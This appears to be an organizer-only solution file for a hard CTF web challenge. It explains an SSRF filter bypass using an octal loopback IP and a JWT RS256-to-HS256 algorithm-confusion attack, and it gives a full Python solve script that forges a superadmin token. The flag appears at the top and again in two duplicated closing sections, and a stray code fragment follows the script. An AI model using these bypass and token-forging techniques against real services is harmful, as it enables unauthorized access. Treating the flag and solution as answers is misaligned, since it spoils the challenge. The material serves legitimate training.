# CTF Challenge: Moogle Drive — Multi-Stage Web Exploitation (ADMIN ONLY)

> **DO NOT distribute this file to participants.**

---

## Challenge Overview

| Field       | Value                                                              |
|-------------|--------------------------------------------------------------------|
| Name        | Moogle Drive — The GTR Octal Bypass & Alg Confusion Trap           |
| Category    | Web / SSRF / Crypto / JWT / XSS                                    |
| Difficulty  | Hard                                                               |
| Points      | 500                                                                |
| Flag        | `$N1PH€RSxTCTF{w04h!_y0u_3xpl0t3d_7H3_33RF_X33_JW7_C0nfus10n_csadsa3}`                 |

## Attack Chain Overview

```
[ Step 1: Upload crafted metadata JSON with downloadUrl pointing to http://0177.0.0.1/keys.json ]
                       │
                       ▼
[ Step 2: Fetch File Preview (/api/drive/fetch) -> Strict Octal SSRF Bypass ]
                       │
                       ▼
[ Step 3: Server Fetches Internal /keys.json -> Leak RSA-2048 Public Key PEM ]
                       │
                       ▼
[ Step 4: JWT Algorithm Confusion Attack (Forge HS256 with Public Key as secret) ]
                       │
                       ▼
[ Step 5: Escalate Role to superadmin & Send Forged JWT to /admin -> Capture Flag ]
```

---

## Vulnerability Details

### 1. SSRF with IP Octal Encoding Filter Bypass via File Preview
- **Vulnerable Surface**: File Preview Fetch (`/api/drive/fetch?file_id=<id>`)
- **Filter**: The server checks hostnames/IPs against localhost, decimal loopback (`127.*`, `127.1`), hex, and domain resolutions (e.g. `localtest.me`).
- **Flaw**: The server resolves standard octal IP representations (`0177.0.0.1`) to `127.0.0.1` while allowing them through the filter.
- **Bypass**: Uploading a `.json` file containing `"downloadUrl": "http://0177.0.0.1/keys.json"` and then triggering preview fetch requests internal `/keys.json`.
- **Result**: Leaks the RSA Public Key from the internal `/keys.json` endpoint.

---

### 2. JWT Algorithm Confusion (RS256 ➔ HS256) & Superadmin Role Escalation
- **Normal Flow**: The server issues tokens signed with its RSA Private Key (`RS256`).
- **Flaw**: The token verification routine checks the token's header `alg`. If `alg == "HS256"`, it validates HMAC-SHA256 using the **RSA Public Key** string as the shared HMAC secret.
- **Exploitation**: An attacker who obtains the public key from `/keys.json` signs an HMAC-SHA256 token preserving all administrator fields (`email: "admin@moogle.com"`, `name: "Moogle Administrator"`, `avatar: "A"`, `color: "#1a73e8"`) with `role` set to `"superadmin"`.

---

## Step-by-Step Solve Script (Python)

```python
import requests, json, base64, hmac, hashlib

BASE = 'http://localhost:5000'

def b64url_encode(data):
    if isinstance(data, str): data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# 1. Create account & login
s = requests.Session()
s.post(f'{BASE}/signup', data={'name': 'Attacker', 'email': 'attacker@moogle.com', 'password': 'Password123!'})

# 2. Upload JSON with Octal SSRF downloadUrl
payload_json = {
    'kind': 'drive#file',
    'title': 'ssrf_leak.json',
    'mimeType': 'application/json',
    'downloadUrl': 'http://0177.0.0.1/keys.json'
}
upload_resp = s.post(f'{BASE}/api/drive/upload', files={'file': ('ssrf_leak.json', json.dumps(payload_json), 'application/json')})
file_id = upload_resp.json()['file']['id']

# 3. Fetch Preview to trigger SSRF and extract RSA Public Key
fetch_resp = s.get(f'{BASE}/api/drive/fetch?file_id={file_id}')
public_key = json.loads(fetch_resp.json()['preview'])['public_key']
print('[+] Extracted RSA Public Key:\n', public_key)

# 4. Forge Superadmin JWT using HS256 + Public Key
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {
    'email': 'admin@moogle.com',
    'name': 'Moogle Administrator',
    'role': 'superadmin',
    'avatar': 'A',
    'color': '#1a73e8'
}

h_b64 = b64url_encode(json.dumps(header))
p_b64 = b64url_encode(json.dumps(payload))
signing_input = f'{h_b64}.{p_b64}'
signature = hmac.new(public_key.encode('utf-8'), signing_input.encode('utf-8'), hashlib.sha256).digest()
forged_jwt = f'{signing_input}.{b64url_encode(signature)}'
print('[+] Forged Superadmin JWT:\n', forged_jwt)

# 5. Access /admin and retrieve the flag
s.cookies.set('jwt_token', forged_jwt)
r_admin = s.get(f'{BASE}/admin')
print('[+] Admin Dashboard Response:\n', r_admin.text)
```f'{BASE}/admin')
print('[+] Admin Dashboard Response:\n', r_admin.text)
```

---

## Flag
```
$N1PH€RSxTCTF{w04h!_y0u_3xpl0t3d_7H3_33RF_X33_JW7_C0nfus10n_csadsa3}
```

---

## Flag
```
$N1PH€RSxTCTF{w04h!_y0u_3xpl0t3d_7H3_33RF_X33_JW7_C0nfus10n_csadsa3}
```
